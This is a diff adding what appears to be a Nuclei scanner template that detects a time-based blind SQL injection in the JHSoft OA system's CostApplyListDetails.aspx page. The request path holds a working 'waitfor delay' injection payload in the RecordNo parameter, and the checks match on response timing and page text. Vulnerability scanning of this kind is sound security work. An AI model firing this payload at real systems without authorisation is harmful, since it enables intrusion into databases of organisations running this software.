@@ -1,0 +1,32 @@
+id: jinher-jhsoft-costapplylistdetails-aspx-sqli
+info:
+  name: JHSoft CostApplyListDetails.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in JHSoft OA system at CostApplyListDetails.aspx endpoint.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/BudgetExecution/CostApplyListDetails.aspx/?RecordNo=1'waitfor+delay%270:0:{{t1}}%27--&strGetType=Travel"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "申请单详细信息"
+          - "申请部门"
+          - "归属类型"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
